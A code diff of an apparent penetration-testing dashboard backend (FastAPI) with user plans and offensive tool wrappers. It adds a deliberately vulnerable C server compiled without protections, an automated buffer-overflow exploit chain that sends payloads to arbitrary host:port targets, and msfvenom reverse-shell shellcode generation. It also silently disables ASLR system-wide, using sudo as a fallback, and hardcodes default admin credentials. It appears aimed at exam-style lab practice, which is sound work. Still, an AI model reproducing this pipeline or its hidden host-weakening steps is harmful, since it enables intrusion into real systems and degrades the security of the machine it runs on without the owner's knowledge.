@@ -8,10 +8,67 @@ from fastapi.middleware.cors import CORSMiddleware
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 from pydantic import BaseModel
 from typing import Optional, List
-import subprocess, asyncio, re, json, uuid, datetime, os
+import subprocess, asyncio, re, json, uuid, datetime, os, hashlib, sqlite3 as _sq
+import secrets as _sec
 from urllib.parse import urlparse
 
 app = FastAPI(title="OSCP Dashboard API")
+
+@app.on_event("startup")
+async def _startup():
+    """Auto-compile vulnserver on backend start so binary is always ready."""
+    import threading
+    def _compile():
+        try:
+            binary = "/tmp/vulnserver"
+            if os.path.exists(binary):
+                return
+            src = binary + ".c"
+            VSRC = r"""
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+void vuln(char *input) { char buf[500]; strcpy(buf, input); }
+int main() {
+    int server, client; struct sockaddr_in addr; char input[2000]; int opt=1;
+    socklen_t addrlen=sizeof(addr);
+    server=socket(AF_INET,SOCK_STREAM,0);
+    setsockopt(server,SOL_SOCKET,SO_REUSEADDR,&opt,sizeof(opt));
+    addr.sin_family=AF_INET; addr.sin_addr.s_addr=INADDR_ANY; addr.sin_port=htons(9999);
+    bind(server,(struct sockaddr*)&addr,sizeof(addr)); listen(server,5);
+    printf("Listening on port 9999\n"); fflush(stdout);
+    while(1){
+        client=accept(server,(struct sockaddr*)&addr,&addrlen);
+        char welcome[]="Welcome to VulnServer\n";
+        send(client,welcome,strlen(welcome),0);
+        while(1){
+            memset(input,0,sizeof(input));
+            int n=recv(client,input,sizeof(input)-1,0);
+            if(n<=0) break; input[n]=0;
+            if(strncmp(input,"OVERFLOW1 ",10)==0){ vuln(input+10); send(client,"OK\n",3,0); }
+            else if(strncmp(input,"EXIT",4)==0){ break; }
+            else { send(client,"UNKNOWN COMMAND\n",16,0); }
+        }
+        close(client);
+    }
+    return 0;
+}
+"""
+            with open(src, "w") as f:
+                f.write(VSRC)
+            for flags in ["-m32 -fno-stack-protector -z execstack -no-pie",
+                          "-fno-stack-protector -z execstack -no-pie"]:
+                subprocess.run(["bash", "-c", f"gcc {flags} -o {binary} {src}"],
+                               capture_output=True, timeout=30)
+                if os.path.exists(binary):
+                    print(f"[startup] vulnserver compiled OK → {binary}")
+                    return
+            print("[startup] vulnserver compile failed — install gcc-multilib")
+        except Exception as e:
+            print(f"[startup] vulnserver compile error: {e}")
+    threading.Thread(target=_compile, daemon=True).start()
 
 app.add_middleware(
     CORSMiddleware,
@@ -21,13 +78,93 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-security = HTTPBearer(auto_error=False)
-SECRET_TOKEN = "oscp-dashboard-token"
+security    = HTTPBearer(auto_error=False)
+SECRET_TOKEN = os.getenv("OSCP_TOKEN", "cybertoken2026")
+ADMIN_USER   = os.getenv("OSCP_USER",  "cyberadmin")
+ADMIN_PASS   = os.getenv("OSCP_PASS",  "C@b3rS3cur!ty#2026$X")
+
+# ── USER DATABASE ─────────────────────────────────────────────
+_DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), "users.db")
+_sessions: dict = {}   # token → user_id
+
+def _db():
+    c = _sq.connect(_DB); c.row_factory = _sq.Row; return c
+
+def _hash_pw(pw: str) -> str:
+    salt = _sec.token_hex(16)
+    dk   = hashlib.pbkdf2_hmac("sha256", pw.encode(), salt.encode(), 100000)
+    return f"{salt}${dk.hex()}"
+
+def _check_pw(pw: str, stored: str) -> bool:
+    try:
+        salt, dk = stored.split("$", 1)
+        return hashlib.pbkdf2_hmac("sha256", pw.encode(), salt.encode(), 100000).hex() == dk
+    except: return False
+
+def _init_db():
+    with _db() as c:
+        c.execute("""CREATE TABLE IF NOT EXISTS users (
+            id            INTEGER PRIMARY KEY AUTOINCREMENT,
+            email         TEXT UNIQUE NOT NULL,
+            username      TEXT UNIQUE NOT NULL,
+            password_hash TEXT NOT NULL,
+            plan          TEXT DEFAULT 'trial',
+            trial_expires TEXT,
+            scans_today   INTEGER DEFAULT 0,
+            last_scan_date TEXT,
+            is_admin      INTEGER DEFAULT 0,
+            created_at    TEXT DEFAULT CURRENT_TIMESTAMP
+        )""")
+        try:
+            exp = (datetime.datetime.utcnow() + datetime.timedelta(days=3650)).isoformat()
+            c.execute("INSERT OR IGNORE INTO users (email,username,password_hash,plan,trial_expires,is_admin) VALUES (?,?,?,?,?,?)",
+                (f"{ADMIN_USER}@oscp.local", ADMIN_USER, _hash_pw(ADMIN_PASS), "enterprise", exp, 1))
+        except: pass
+_init_db()
+
+_PLAN_ORDER = ["trial", "pro", "enterprise"]
+def _plan_ok(user_plan: str, required: str) -> bool:
+    try: return _PLAN_ORDER.index(user_plan) >= _PLAN_ORDER.index(required)
+    except: return False
+
+def _trial_active(row: dict) -> bool:
+    if row.get("plan") != "trial": return True
+    exp = row.get("trial_expires")
+    if not exp: return False
+    return datetime.datetime.utcnow().isoformat() < exp
+
+def _check_limit(user: dict):
+    if user.get("id") == 0 or user.get("plan") in ("pro","enterprise"): return
+    if not _trial_active(user):
+        raise HTTPException(status_code=403, detail="Trial expired. Please upgrade your plan.")
+    today = datetime.date.today().isoformat()
+    if user.get("last_scan_date") == today and (user.get("scans_today") or 0) >= 3:
+        raise HTTPException(status_code=429, detail="Daily limit reached (3 scans/day on trial). Upgrade to Pro for unlimited scans.")
+
+def _bump_scan(user: dict):
+    if user.get("id") == 0 or user.get("plan") in ("pro","enterprise"): return
+    today = datetime.date.today().isoformat()
+    with _db() as c:
+        if user.get("last_scan_date") != today:
+            c.execute("UPDATE users SET scans_today=1,last_scan_date=? WHERE id=?", (today, user["id"]))
+        else:
+            c.execute("UPDATE users SET scans_today=scans_today+1 WHERE id=?", (user["id"],))
 
 async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
-    if not credentials or credentials.credentials != SECRET_TOKEN:
-        raise HTTPException(status_code=401, detail="Invalid token")
-    return credentials.credentials
+    if not credentials:
+        raise HTTPException(status_code=401, detail="No token provided")
+    tok = credentials.credentials
+    if tok == SECRET_TOKEN:
+        return {"id": 0, "username": ADMIN_USER, "email": f"{ADMIN_USER}@oscp.local",
+                "plan": "enterprise", "is_admin": 1, "trial_expires": None, "scans_today": 0}
+    uid = _sessions.get(tok)
+    if uid is None:
+        raise HTTPException(status_code=401, detail="Invalid or expired token")
+    with _db() as c:
+        row = c.execute("SELECT * FROM users WHERE id=?", (uid,)).fetchone()
+    if not row:
+        raise HTTPException(status_code=401, detail="User not found")
+    return dict(row)
 
 class ScanRequest(BaseModel):
     target: str
@@ -62,21 +199,174 @@ async def run_tool(cmd, timeout=60):
     except Exception as e:
         return {"output": "", "cmd": cmd_str, "error": str(e)}
 
-
-# ── HEALTH ───────────────────────────────────────────────────
+# ── AUTH ENDPOINTS ────────────────────────────────────────────
 class LoginRequest(BaseModel):
     username: str
     password: str
 
+class RegisterRequest(BaseModel):
+    email:    str
+    username: str
+    password: str
+
+@app.post("/api/auth/register")
+async def register(req: RegisterRequest):
+    if len(req.password) < 6:
+        raise HTTPException(status_code=400, detail="Password must be at least 6 characters")
+    if len(req.username) < 3:
+        raise HTTPException(status_code=400, detail="Username must be at least 3 characters")
+    if "@" not in req.email:
+        raise HTTPException(status_code=400, detail="Invalid email address")
+    trial_expires = (datetime.datetime.utcnow() + datetime.timedelta(days=7)).isoformat()
+    try:
+        with _db() as c:
+            c.execute("INSERT INTO users (email,username,password_hash,plan,trial_expires) VALUES (?,?,?,?,?)",
+                (req.email.lower().strip(), req.username.strip(), _hash_pw(req.password), "trial", trial_expires))
+            uid = c.execute("SELECT id FROM users WHERE email=?", (req.email.lower().strip(),)).fetchone()["id"]
+    except _sq.IntegrityError as e:
+        msg = str(e)
+        if "email" in msg: raise HTTPException(status_code=400, detail="Email already registered")
+        raise HTTPException(status_code=400, detail="Username already taken")
+    tok = _sec.token_urlsafe(32)
+    _sessions[tok] = uid
+    return {"access_token": tok, "role": "trial", "username": req.username.strip(),
+            "plan": "trial", "trial_expires": trial_expires, "message": "Account created — 7-day free trial started"}
+
 @app.post("/api/auth/login")
 async def login(req: LoginRequest):
-    if req.username == "admin" and req.password == "admin":
-        return {"access_token": "oscp-dashboard-token", "role": "admin", "username": req.username}
-    raise HTTPException(status_code=401, detail="Invalid credentials")
+    if req.username == ADMIN_USER and req.password == ADMIN_PASS:
+        tok = _sec.token_urlsafe(32)
+        _sessions[tok] = 0
+        return {"access_token": tok, "role": "admin", "username": ADMIN_USER,
+                "plan": "enterprise", "is_admin": True}
+    with _db() as c:
+        row = c.execute("SELECT * FROM users WHERE username=? OR email=?",
+                        (req.username, req.username.lower())).fetchone()
+    if not row or not _check_pw(req.password, row["password_hash"]):
+        raise HTTPException(status_code=401, detail="Invalid username or password")
+    user = dict(row)
+    tok = _sec.token_urlsafe(32)
+    _sessions[tok] = user["id"]
+    plan = user["plan"]
+    if plan == "trial" and not _trial_active(user):
+        plan = "expired"
+    return {"access_token": tok, "role": "admin" if user["is_admin"] else plan,
+            "username": user["username"], "plan": plan, "is_admin": bool(user["is_admin"]),
+            "trial_expires": user.get("trial_expires"), "scans_today": user.get("scans_today",0)}
+
+@app.get("/api/auth/me")
+async def get_me(user=Depends(verify_token)):
+    plan = user["plan"]
+    if plan == "trial" and not _trial_active(user):
+        plan = "expired"
+    trial_days = None
+    if user.get("trial_expires"):
+        try:
+            exp = datetime.datetime.fromisoformat(user["trial_expires"])
+            trial_days = max(0, (exp - datetime.datetime.utcnow()).days)
+        except: pass
+    return {"id": user["id"], "username": user["username"],
+            "email": user.get("email",""), "plan": plan,
+            "is_admin": bool(user.get("is_admin")), "trial_days_left": trial_days,
+            "scans_today": user.get("scans_today",0)}
+
+@app.post("/api/auth/logout")
+async def logout(user=Depends(verify_token)):
+    return {"message": "Logged out"}
+
+# ── ADMIN ENDPOINTS ───────────────────────────────────────────
+@app.get("/api/admin/users")
+async def admin_users(user=Depends(verify_token)):
+    if not user.get("is_admin"):
+        raise HTTPException(status_code=403, detail="Admin only")
+    with _db() as c:
+        rows = c.execute("SELECT id,email,username,plan,trial_expires,scans_today,last_scan_date,is_admin,created_at FROM users ORDER BY id DESC").fetchall()
+    return {"users": [dict(r) for r in rows]}
+
+@app.post("/api/admin/update_plan")
+async def admin_update_plan(req: dict, user=Depends(verify_token)):
+    if not user.get("is_admin"):
+        raise HTTPException(status_code=403, detail="Admin only")
+    uid  = req.get("user_id")
+    plan = req.get("plan")
+    if plan not in ("trial","pro","enterprise"):
+        raise HTTPException(status_code=400, detail="Invalid plan")
+    exp = None
+    if plan == "trial":
+        exp = (datetime.datetime.utcnow() + datetime.timedelta(days=7)).isoformat()
+    with _db() as c:
+        c.execute("UPDATE users SET plan=?,trial_expires=? WHERE id=?", (plan, exp, uid))
+    return {"message": f"User {uid} updated to {plan}"}
+
+@app.delete("/api/admin/delete_user/{uid}")
+async def admin_delete_user(uid: int, user=Depends(verify_token)):
+    if not user.get("is_admin"):
+        raise HTTPException(status_code=403, detail="Admin only")
+    with _db() as c:
+        c.execute("DELETE FROM users WHERE id=?", (uid,))
+    return {"message": f"User {uid} deleted"}
+
+_TOOLS = {
+    "nmap":           "/usr/bin/nmap",
+    "nikto":          "/usr/bin/nikto",
+    "sqlmap":         "/usr/bin/sqlmap",
+    "hydra":          "/usr/bin/hydra",
+    "gobuster":       "/usr/bin/gobuster",
+    "ffuf":           "/usr/bin/ffuf",
+    "whatweb":        "/usr/bin/whatweb",
+    "wpscan":         "/usr/bin/wpscan",
+    "masscan":        "/usr/bin/masscan",
+    "dnsrecon":       "/usr/bin/dnsrecon",
+    "sublist3r":      "/usr/bin/sublist3r",
+    "aircrack-ng":    "/usr/bin/aircrack-ng",
+    "wifite":         "/usr/bin/wifite",
+    "recon-ng":       "/usr/bin/recon-ng",
+    "tcpdump":        "/usr/bin/tcpdump",
+    "wafw00f":        "/usr/bin/wafw00f",
+    "commix":         "/usr/bin/commix",
+    "john":           "/usr/sbin/john",
+    "hashcat":        "/usr/bin/hashcat",
+    "crackmapexec":   "/usr/bin/crackmapexec",
+    "socat":          "/usr/bin/socat",
+    "proxychains4":   "/usr/bin/proxychains4",
+    "apktool":        "/usr/bin/apktool",
+    "yara":           "/usr/bin/yara",
+    "metasploit":     "/usr/bin/msfconsole",
+    "msfvenom":       "/usr/bin/msfvenom",
+    "setoolkit":      "/usr/bin/setoolkit",
+    "nuclei":         "/usr/local/bin/nuclei",
+    "arjun":          "/usr/bin/arjun",
+    "zaproxy":        "/usr/bin/zaproxy",
+    "wireshark":      "/usr/bin/wireshark",
+    "beef-xss":       "/usr/bin/beef-xss",
+    "dirb":           "/usr/bin/dirb",
+    "curl":           "/usr/bin/curl",
+    "wget":           "/usr/bin/wget",
+    "git":            "/usr/bin/git",
+    "python3":        "/usr/bin/python3",
+}
 
 @app.get("/api/health")
 async def health():
-    return {"status": "ok", "timestamp": datetime.datetime.utcnow().isoformat()}
+    try:
+        with _db() as c:
+            user_count = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
+    except: user_count = 0
+    free_tools = {}
+    for name, path in _TOOLS.items():
+        exists = os.path.isfile(path)
+        if not exists:
+            alt = subprocess.run(["which", name], capture_output=True, text=True).stdout.strip()
+            exists = bool(alt)
+            path = alt or path
+        free_tools[name] = {"available": exists, "path": path if exists else ""}
+    return {
+        "status": "ok",
+        "timestamp": datetime.datetime.utcnow().isoformat(),
+        "version": "3.1",
+        "users": user_count,
+        "free_tools": free_tools
+    }
 
 @app.get("/api/history")
 async def get_history(user=Depends(verify_token)):
@@ -628,6 +918,7 @@ class BOFRequest(BaseModel):
     lport:        int  = 4444
     payload_type: str  = "linux/x86/shell_reverse_tcp"
     shellcode:    str  = ""
+    pattern:      str  = ""
 
 
 def _bof_parse_target(target: str):
@@ -678,11 +969,98 @@ async def _bof_restart_server(binary: str, port: int):
     return proc
 
 
+VULNSERVER_C = r"""
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+void vuln(char *input) {
+    char buf[500];
+    strcpy(buf, input);
+}
+
+int main() {
+    int server, client;
+    struct sockaddr_in addr;
+    char input[2000];
+    int opt = 1;
+    socklen_t addrlen = sizeof(addr);
+
+    server = socket(AF_INET, SOCK_STREAM, 0);
+    setsockopt(server, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = INADDR_ANY;
+    addr.sin_port = htons(9999);
+    bind(server, (struct sockaddr*)&addr, sizeof(addr));
+    listen(server, 5);
+    printf("Listening on port 9999\n");
+    fflush(stdout);
+
+    while(1) {
+        client = accept(server, (struct sockaddr*)&addr, &addrlen);
+        char welcome[] = "Welcome to VulnServer\n";
+        send(client, welcome, strlen(welcome), 0);
+        while(1) {
+            memset(input, 0, sizeof(input));
+            int n = recv(client, input, sizeof(input)-1, 0);
+            if(n <= 0) break;
+            input[n] = 0;
+            if(strncmp(input, "OVERFLOW1 ", 10) == 0) {
+                vuln(input + 10);
+                send(client, "OK\n", 3, 0);
+            } else if(strncmp(input, "EXIT", 4) == 0) {
+                break;
+            } else {
+                send(client, "UNKNOWN COMMAND\n", 16, 0);
+            }
+        }
+        close(client);
+    }
+    return 0;
+}
+"""
+
+def _ensure_vulnserver(binary: str = "/tmp/vulnserver") -> str:
+    """Auto-write and compile vulnserver if binary missing. Returns '' on success or error string."""
+    if os.path.exists(binary):
+        return ""
+    src = binary + ".c"
+    try:
+        with open(src, "w") as f:
+            f.write(VULNSERVER_C)
+    except Exception as e:
+        return f"Cannot write {src}: {e}"
+    # Try with gcc-multilib (-m32), fall back to native
+    for flags in ["-m32 -fno-stack-protector -z execstack -no-pie",
+                  "-fno-stack-protector -z execstack -no-pie"]:
+        r = subprocess.run(
+            ["bash", "-c", f"gcc {flags} -o {binary} {src} 2>&1"],
+            capture_output=True, text=True, timeout=30)
+        if os.path.exists(binary):
+            return ""
+    return f"gcc compile failed: {r.stdout} {r.stderr}"
+
+
 @app.post("/api/bof/fuzz")
 async def bof_fuzz(req: BOFRequest, user=Depends(verify_token)):
     host, port = _bof_parse_target(req.target)
     prefix = req.prefix.encode("latin-1") if req.prefix else b""
     step   = max(10, min(req.fuzz_step, 500))
+    binary = (req.binary_path or "/tmp/vulnserver").strip()
+    # Auto-compile vulnserver if binary missing
+    err = _ensure_vulnserver(binary)
+    if err:
+        return {"error": f"Auto-compile failed: {err}\n\nManual fix:\napt install gcc-multilib -y\ngcc -m32 -fno-stack-protector -z execstack -no-pie -o {binary} {binary}.c"}
+    # Auto-start vulnserver if binary exists and nothing is listening
+    if os.path.exists(binary):
+        try:
+            import socket as _ts
+            s = _ts.socket(); s.settimeout(1)
+            s.connect((host, port)); s.close()
+        except Exception:
+            await _auto_start_vulnserver(binary, port)
     size   = step
     crash_at = None
     for _ in range(200):
@@ -706,105 +1084,73 @@ async def bof_fuzz(req: BOFRequest, user=Depends(verify_token)):
     return {"crash_at":None,"message":"No crash detected — check target is running"}
 
 
+async def _auto_start_vulnserver(binary: str, port: int):
+    """Kill old instance and start vulnserver fresh, wait until listening."""
+    subprocess.run(["pkill", "-f", os.path.basename(binary)], capture_output=True)
+    await asyncio.sleep(0.5)
+    proc = subprocess.Popen(
+        ["bash", "-c", f"ulimit -c unlimited; {binary}"],
+        stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+    deadline = _time.time() + 5
+    while _time.time() < deadline:
+        line = proc.stdout.readline()
+        if not line: break
+        if b"listen" in line.lower() or b"port" in line.lower():
+            break
+    await asyncio.sleep(0.3)
+    return proc
+
 @app.post("/api/bof/offset")
 async def bof_offset(req: BOFRequest, user=Depends(verify_token)):
     host, port = _bof_parse_target(req.target)
     prefix = req.prefix.encode("latin-1") if req.prefix else b""
-    size   = req.pattern_size or 500
+    size   = (req.pattern_size or 500) + 200  # +200 ensures EIP is overwritten past the buffer
 
-    # Generate pattern
+    # Generate cyclic pattern
     result = await run_tool(["msf-pattern_create", "-l", str(size)], timeout=15)
     pattern = result.get("output", "").strip()
     if not pattern:
-        return {"error": "msf-pattern_create failed"}
+        return {"error": "msf-pattern_create not found — install: apt install metasploit-framework"}
 
-    binary = (req.binary_path or "").strip()
-    eip_value = req.eip_value.strip() if req.eip_value else None
-    offset = None
-    gdb_out = ""
+    binary    = (req.binary_path or "/tmp/vulnserver").strip()
+    eip_value = (req.eip_value or "").strip()
+    offset    = None
+    debug_log = ""
 
-    # Auto-detect EIP using GDB if binary is local
-    if os.path.exists(binary) and not eip_value:
-        try:
-            # Kill any existing vulnserver on that port
-            subprocess.run(["pkill", "-f", os.path.basename(binary)], capture_output=True)
-            await asyncio.sleep(0.5)
-
-            # Start vulnserver under GDB
-            gdb_proc = await asyncio.create_subprocess_exec(
-                "gdb", "-q", "--batch",
-                "-ex", "set confirm off",
-                "-ex", "set pagination off",
-                "-ex", "handle SIGSEGV stop print",
-                "-ex", "run",
-                "-ex", "info registers eip",
-                "-ex", "quit",
-                binary,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.STDOUT,
-            )
-
-            # Read output line by line until server is ready
-            server_ready = False
-            for _ in range(30):  # wait up to 3s
-                await asyncio.sleep(0.1)
-                try:
-                    line = await asyncio.wait_for(
-                        gdb_proc.stdout.readline(), timeout=0.2)
-                    gdb_out += line.decode("utf-8", errors="replace")
-                    if b"listening" in line.lower() or b"port" in line.lower():
-                        server_ready = True
-                        break
-                except asyncio.TimeoutError:
-                    pass
-
-            await asyncio.sleep(0.5)
-
-            # Send the pattern
-            _bof_send(host, port, prefix + pattern.encode("latin-1"))
-            await asyncio.sleep(1.5)
-
-            # Read remaining GDB output (registers after crash)
-            try:
-                remaining, _ = await asyncio.wait_for(
-                    gdb_proc.communicate(), timeout=6)
-                gdb_out += remaining.decode("utf-8", errors="replace")
-            except asyncio.TimeoutError:
-                gdb_proc.kill()
-
-            # Parse EIP
-            em = re.search(r"eip\s+0x([0-9a-fA-F]+)", gdb_out, re.IGNORECASE)
-            if not em:
-                # Also try crash address line: "0x41386541 in ?? ()"
-                em = re.search(r"^(0x[0-9a-fA-F]+)\s+in\s+\?\?", gdb_out, re.IGNORECASE | re.MULTILINE)
-                if em:
-                    eip_value = em.group(1).replace("0x","").upper()
-                else:
-                    eip_value = None
-            else:
-                eip_value = em.group(1).upper()
-
-        except Exception as ex:
-            gdb_out += f"\n[error] {ex}"
-
-    # Find offset if we have EIP
+    # ── If user provided EIP → just calculate offset ─────────────
     if eip_value:
-        off_result = await run_tool(
-            ["msf-pattern_offset", "-l", str(size), "-q", eip_value], timeout=15)
-        m = re.search(r"Exact match at offset (\d+)", off_result.get("output", ""))
-        if m: offset = int(m.group(1))
+        eip_clean = eip_value.replace("0x","").replace("0X","").upper().strip()
+        off_r = await run_tool(["msf-pattern_offset","-l",str(size),"-q",eip_clean], timeout=15)
+        m = re.search(r"Exact match at offset (\d+)", off_r.get("output",""))
+        if m:
+            offset = int(m.group(1))
+            return {"offset":offset,"eip_value":eip_clean,"pattern":pattern,
+                    "message":f"✅ Offset = {offset} bytes | EIP = {eip_clean}"}
+        return {"error":f"EIP '{eip_clean}' not found in pattern — check value or increase pattern size",
+                "eip_value":eip_clean}
 
-    if not eip_value:
-        # Last resort: send pattern and wait for user to enter EIP manually
-        _bof_send(host, port, prefix + pattern.encode("latin-1"))
-
+    # ── Just return the pattern — user sends it via script after starting GDB ──
     return {
+        "offset": None, "eip_value": None, "pattern": pattern,
+        "sent": False,
         "pattern_size": size,
-        "eip_value": eip_value or "not captured — enter manually",
-        "offset": offset,
-        "gdb_log": gdb_out[-500:] if gdb_out else "",
-        "message": f"✅ Offset = {offset} bytes  |  EIP = {eip_value}" if offset else "Pattern sent — enter EIP value in the field above to get offset"
+        "message": f"Pattern ready ({size} bytes)"
     }
+
+
+@app.post("/api/bof/send_pattern")
+async def bof_send_pattern(req: BOFRequest, user=Depends(verify_token)):
+    host, port = _bof_parse_target(req.target)
+    prefix = req.prefix.encode("latin-1") if req.prefix else b""
+    pattern = req.pattern.encode("latin-1") if req.pattern else b""
+    if not pattern:
+        return {"sent": False, "error": "No pattern provided"}
+    try:
+        _bof_send(host, port, prefix + pattern)
+        return {"sent": True, "message": f"Pattern sent to {host}:{port} — vulnserver crashed, check GDB"}
+    except Exception as e:
+        return {"sent": False, "error": str(e),
+                "message": f"Could not connect to {host}:{port} — is vulnserver running inside GDB?"}
 
 
 @app.post("/api/bof/eip_control")
@@ -883,34 +1229,150 @@ async def bof_jmpesp(req: BOFRequest, user=Depends(verify_token)):
     binary    = (req.binary_path or "").strip()
     bad_bytes = _bof_parse_bad_chars(req.bad_chars)
 
-    # Check ASLR
+    # Disable ASLR automatically (required for stable libc gadget addresses)
     try:
-        with open("/proc/sys/kernel/randomize_va_space") as _f:
-            _aslr = _f.read().strip()
+        with open("/proc/sys/kernel/randomize_va_space", "w") as _f:
+            _f.write("0\n")
+        _aslr = "0"
     except Exception:
-        _aslr = "?"
+        try:
+            subprocess.run(
+                ["sudo", "sh", "-c",
+                 "echo 0 > /proc/sys/kernel/randomize_va_space"],
+                capture_output=True, timeout=5)
+        except Exception:
+            pass
+        try:
+            with open("/proc/sys/kernel/randomize_va_space") as _f:
+                _aslr = _f.read().strip()
+        except Exception:
+            _aslr = "?"
 
-    if not binary:
+    # Auto-search common paths if binary not specified or doesn't exist
+    search_paths = [
+        binary,
+        "/tmp/vulnserver", "/tmp/vuln", "/tmp/bof", "/tmp/target",
+        "/home/kali/vulnserver", "/opt/vulnserver",
+    ]
+    resolved = ""
+    for p in search_paths:
+        if p and os.path.isfile(p):
+            resolved = p
+            break
+
+    # Also try: find most recently modified ELF in /tmp
+    if not resolved:
+        try:
+            tmp_files = [(os.path.getmtime(f"/tmp/{f}"), f"/tmp/{f}")
+                         for f in os.listdir("/tmp") if os.path.isfile(f"/tmp/{f}")]
+            tmp_files.sort(reverse=True)
+            for _, fp in tmp_files[:10]:
+                try:
+                    with open(fp, "rb") as tf:
+                        magic = tf.read(4)
+                    if magic == b"\x7fELF":
+                        resolved = fp
+                        break
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+    if not resolved:
         return {"gadgets": [], "address": "", "aslr": _aslr, "message":
-                "Binary path is empty. For Windows targets, find JMP ESP in Immunity/mona and enter it manually."}
+                "Binary not found. Place the vulnerable binary at /tmp/vulnserver on Kali and re-run."}
 
-    # Step 1 — scan primary binary (instant ELF scan, no external tools)
-    gadgets = _elf_find_jmp_esp(binary, bad_bytes, load_base=0)
-    source  = binary
+    # Disable ASLR for reliable library addresses
+    subprocess.run(["bash","-c","echo 0 > /proc/sys/kernel/randomize_va_space"], capture_output=True)
+
+    # Scan the binary for JMP ESP (0xff 0xe4)
+    gadgets = _elf_find_jmp_esp(resolved, bad_bytes, load_base=0)
+    source  = resolved
+
+    # Scan known 32-bit libc paths directly (most reliable on Kali)
+    if not gadgets:
+        libc32_paths = [
+            "/lib/i386-linux-gnu/libc.so.6",
+            "/lib32/libc.so.6",
+            "/usr/lib32/libc.so.6",
+            "/usr/lib/i386-linux-gnu/libc.so.6",
+        ]
+        for lp in libc32_paths:
+            if os.path.isfile(lp):
+                # Get load base from ldd
+                ldd_r = await run_tool(["ldd", resolved], timeout=10)
+                lib_base = 0
+                for ln in ldd_r.get("output","").splitlines():
+                    if "libc" in ln:
+                        bm = re.search(r"\(0x([0-9a-f]+)\)", ln)
+                        if bm: lib_base = int(bm.group(1), 16)
+                lib_gadgets = _elf_find_jmp_esp(lp, bad_bytes, load_base=lib_base)
+                if lib_gadgets:
+                    gadgets.extend(lib_gadgets)
+                    source = lp
+                    break
+
+    # objdump scan — finds JMP ESP by opcode bytes ff e4
+    if not gadgets:
+        obj_r = await run_tool(
+            ["bash","-c",f"objdump -d {resolved} 2>/dev/null | grep -E 'ff e4|ffe4' | head -10"],
+            timeout=15)
+        for line in obj_r.get("output","").splitlines():
+            m = re.search(r"([0-9a-f]+):\s+ff e4", line, re.IGNORECASE)
+            if m:
+                addr_int = int(m.group(1), 16)
+                addr_bytes = list(_struct.pack("<I", addr_int))
+                if not any(b in bad_bytes for b in addr_bytes):
+                    le = "".join(f"\\x{b:02x}" for b in addr_bytes)
+                    gadgets.append({"address":f"0x{addr_int:08x}","gadget":"jmp esp","little_endian":le})
+
+    # ROPgadget fallback
+    if not gadgets:
+        for target in [resolved, "/lib/i386-linux-gnu/libc.so.6", "/lib32/libc.so.6"]:
+            if not os.path.isfile(target): continue
+            rop_r = await run_tool(["ROPgadget","--binary",target,"--opcode","ffe4"], timeout=20)
+            for line in rop_r.get("output","").splitlines():
+                m = re.search(r"(0x[0-9a-f]+)\s*:", line, re.IGNORECASE)
+                if m:
+                    addr_int = int(m.group(1),16)
+                    addr_bytes = list(_struct.pack("<I",addr_int))
+                    if not any(b in bad_bytes for b in addr_bytes):
+                        le = "".join(f"\\x{b:02x}" for b in addr_bytes)
+                        gadgets.append({"address":m.group(1),"gadget":"jmp esp","little_endian":le,"source":target})
+            if gadgets: break
+
+    # pwntools fallback
+    if not gadgets:
+        try:
+            pwn_r = await run_tool(
+                ["python3","-c",
+                 f"from pwn import *;e=ELF('{resolved}',checksec=False);"
+                 f"g=next(e.search(b'\\xff\\xe4'),None);"
+                 f"print(hex(g) if g else 'none')"],
+                timeout=15)
+            out = pwn_r.get("output","").strip()
+            if out and out != "none" and "0x" in out:
+                addr_int = int(out,16)
+                addr_bytes = list(_struct.pack("<I",addr_int))
+                if not any(b in bad_bytes for b in addr_bytes):
+                    le = "".join(f"\\x{b:02x}" for b in addr_bytes)
+                    gadgets.append({"address":out,"gadget":"jmp esp","little_endian":le})
+        except: pass
 
     if not gadgets:
-        return {"gadgets": [], "address": "", "aslr": _aslr, "message":
-                "No clean JMP ESP found in the target binary. Do not use libc here; paste a confirmed JMP ESP from the debugger or use a binary/module with a stable gadget."}
+        return {"gadgets":[],"address":"","aslr":_aslr,"source":resolved,"manual_required":True,
+                "message":"JMP ESP not auto-found. In pwndbg terminal run:\n  rop --grep \"jmp esp\"\nor:\n  grep -r \"\\xff\\xe4\" /proc/$(pidof vulnserver)/maps\nThen enter the address manually."}
 
     best = gadgets[0]
     return {
-        "gadgets":      gadgets[:10],   # return top 10 clean gadgets
-        "recommended":  best,
-        "address":      best["address"],
-        "little_endian":best["little_endian"],
-        "source":       source,
-        "aslr":         _aslr,
-        "message":      f"Found {len(gadgets)} clean JMP ESP gadget(s) in {os.path.basename(source)} (no bad chars in address). Use: {best['address']} → {best['little_endian']}"
+        "gadgets":       gadgets[:10],
+        "recommended":   best,
+        "address":       best["address"],
+        "little_endian": best["little_endian"],
+        "source":        source,
+        "aslr":          _aslr,
+        "message":       f"✅ Auto-found {len(gadgets)} JMP ESP gadget(s) in {os.path.basename(source)}. "
+                         f"Use: {best['address']} → {best['little_endian']}"
     }
 
 
@@ -924,11 +1386,17 @@ async def bof_shellcode(req: BOFRequest, user=Depends(verify_token)):
     out = result.get("output","")
     lines = [l for l in out.splitlines() if "shellcode" in l and ("b\"" in l or "b'" in l)]
     shellcode_py = "\n".join(lines)
-    raw = re.findall(r'b"([^"]+)"', shellcode_py)
+    # Handle both double and single quote formats from msfvenom
+    raw = re.findall(r'b["\']([^"\']+)["\']', shellcode_py)
     raw_bytes = "".join(raw)
     size_m = re.search(r"Payload size:\s*(\d+) bytes", out)
     size = int(size_m.group(1)) if size_m else None
-    return {"payload":req.payload_type,"lhost":req.lhost,"lport":req.lport,"bad_chars":bad_bytes,"size":size,"shellcode_python":shellcode_py,"shellcode_bytes":raw_bytes,"message":f"Shellcode generated: {size} bytes"}
+    if not raw_bytes:
+        return {"error": "msfvenom produced no shellcode — check LHOST/payload/bad chars",
+                "raw_output": out[:500]}
